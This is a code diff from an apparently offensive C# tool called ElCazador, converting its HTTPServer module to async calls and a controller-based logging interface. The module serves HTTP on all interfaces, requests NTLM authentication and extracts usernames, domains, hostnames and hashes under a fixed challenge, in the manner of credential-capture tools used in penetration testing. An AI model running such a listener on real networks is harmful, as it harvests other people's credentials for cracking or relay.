@@ -10,27 +10,28 @@ using System.Diagnostics;
 using ElCazador.Worker.Modules.Servers.Models;
 using System.Threading.Tasks;
 using ElCazador.Worker.Models;
+using ElCazador.Worker.Interfaces;
 
 namespace ElCazador.Worker.Modules.Servers
 {
-    internal class HTTPServer : IModule
+    internal class HTTPServer : AbstractModule, IModule
     {
         private HttpListener Listener { get; set; }
         private int Port { get; set; }
 
         public bool IsEnabled => throw new NotImplementedException();
 
-        public HTTPServer(int port)
+        public HTTPServer(IWorkerController controller, int port) : base(controller, "HTTPServer")
         {
             this.Initialize(port);
         }
 
-        public void Run()
+        public async Task Run()
         {
-            Listen();
+            await Listen();
         }
 
-        private void Listen()
+        private async Task Listen()
         {
             Listener = new HttpListener();
             Listener.Prefixes.Add("http://*:" + Port.ToString() + "/");
@@ -40,23 +41,23 @@ namespace ElCazador.Worker.Modules.Servers
                 try
                 {
                     HttpListenerContext context = Listener.GetContext();
-                    Process(context);
+                    await Process(context);
                 }
-                catch (Exception)
+                catch (Exception e)
                 {
-                    
+                    await Controller.Log(Name, e.ToString());
                 }
             }
         }
 
-        private void Process(HttpListenerContext context)
+        private async Task Process(HttpListenerContext context)
         {
-            GetNTLMHash(context);
+            await GetNTLMHash(context);
 
             context.Response.OutputStream.Close();
         }
 
-        private void GetNTLMHash(HttpListenerContext context)
+        private async Task GetNTLMHash(HttpListenerContext context)
         {
             byte[] buffer;
             if (context.Request.Headers.Get("Authorization") == null)
@@ -125,8 +126,9 @@ namespace ElCazador.Worker.Modules.Servers
                     short hostNameOffset = BitConverter.ToInt16(auth, 48);
                     string hostName = Encoding.Unicode.GetString(auth.Skip(hostNameOffset).Take(hostNameLen).ToArray());
 
-                    Worker.AddHash(new Hash {
-                        IPAddress =  context.Request.RemoteEndPoint.Address,
+                    await Controller.Output(Name, new Hash
+                    {
+                        IPAddress = context.Request.RemoteEndPoint.Address,
                         User = user,
                         Domain = domain,
                         Challenge = "1122334455667788",
@@ -136,7 +138,7 @@ namespace ElCazador.Worker.Modules.Servers
                 }
                 else
                 {
-                    Worker.WriteLine("Unknown packet type {0}", packetType.ToString());
+                    await Controller.Log(Name, "Unknown packet type {0}", packetType.ToString());
                 }
             }
         }
